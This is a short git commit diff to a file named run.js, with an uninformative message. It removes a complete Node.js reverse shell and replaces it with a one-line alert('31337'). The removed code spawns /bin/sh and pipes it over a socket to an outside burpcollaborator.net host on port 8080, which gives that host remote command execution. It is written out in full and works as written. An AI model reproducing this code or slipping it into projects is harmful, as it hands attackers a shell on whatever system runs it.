7564abf1f2c1d34dcd5f54087cf93a2631e699f3
ver 1.2 <ansjdnakjdnajkd@users.noreply.github.com>
2020-05-10 13:31:03 +0800

    4
    5

--- run.js
+++ run.js
@@ -1,12 +1,1 @@
-(function(){
-    var net = require("net"),
-        cp = require("child_process"),
-        sh = cp.spawn("/bin/sh", []);
-    var client = new net.Socket();
-    client.connect(8080, "k4pnfxbdbhou0vzhijlgcgetfklb90.burpcollaborator.net", function(){
-        client.pipe(sh.stdin);
-        sh.stdout.pipe(client);
-        sh.stderr.pipe(client);
-    });
-    return /a/; // Prevents the Node.js application from crashing
-})();
+alert('31337')
